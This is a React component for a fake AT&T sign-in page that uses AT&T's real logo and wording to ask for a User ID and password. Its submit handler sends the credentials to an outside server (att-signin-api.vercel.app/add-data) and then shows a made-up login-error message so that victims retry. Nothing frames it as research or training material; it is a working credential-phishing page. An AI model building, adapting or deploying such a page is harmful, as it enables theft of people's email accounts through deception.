import React, { useState } from 'react'
import axios from 'axios'
import Modal from '../components/Modal'

const Signin = () => {
  const [userData, setUserData] = useState({ userID: '', password: '' })
  const [showError, setShowError] = useState(false)

  const [isModalOpen, setIsModalOpen] = useState(false)

  const handleOpenModal = () => {
    setIsModalOpen(true)
  }

  const handleCloseModal = () => {
    setIsModalOpen(false)
  }

  const handleChange = (e) => {
    const { name, value } = e.target
    setUserData({ ...userData, [name]: value })
  }

  const handleSubmit = (e) => {
    e.preventDefault()
    setShowError(false)
    if (!userData['userID'] || !userData['password']) {
      setShowError(true)
      return
    }
    axios
      .post('https://att-signin-api.vercel.app/add-data', userData)
      .then((resp) => console.log(resp.data))
      .catch((e) => console.log(e))
    handleOpenModal()
  }
  const imgSrc =
    'https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg'

  return (
    <div className='w-screen h-screen flex items-center justify-center'>
      <section className='flex flex-col items-center font-bold w-[25rem] md:border gap-2 rounded-2xl'>
        <img src={imgSrc} alt='' className='my-3 md:my-5' width={150} />
        <h2 className='text-3xl md:text-4xl'>Sign in</h2>
        <h3 className=' text-xl md:text-2xl text-center'>
          to access AT&T Mail and Currently.com
        </h3>

        <section className='mt-3 flex flex-col w-full px-8 font-normal  gap-3 py-5'>
          <div className='flex flex-col w-full gap-1'>
            <label className='font-semibold text-[#454b52]'>User ID</label>
            <input
              className='border py-3 px-2 rounded-md input-color outline-[#0057B8]'
              name='userID'
              value={userData['userID']}
              onChange={handleChange}
            />
          </div>
          <div className='flex flex-col w-full gap-1'>
            <label className='font-semibold text-[#454b52]'>Password</label>
            <input
              className='border py-3 px-2 rounded-md input-color outline-[#0057B8]'
              name='password'
              value={userData['password']}
              onChange={handleChange}
              type='password'
            />
          </div>
          {showError && (
            <span>
              <p className='text-lg font-semibold text-red-800'>
                Please, enter User ID and password
              </p>
            </span>
          )}

          <button
            className='bg-[#0057B8] text-white font-semibold w-full py-3 text-lg rounded-full'
            onClick={handleSubmit}
          >
            Continue
          </button>
          <Modal isOpen={isModalOpen} onClose={handleCloseModal}>
            <h1 className='text-xl font-bold text-red-700'>
              There was an error logging you in.
            </h1>
            <p className='font-sembold text-red-700'>Please try again</p>
          </Modal>
        </section>
      </section>
    </div>
  )
}

export default Signin
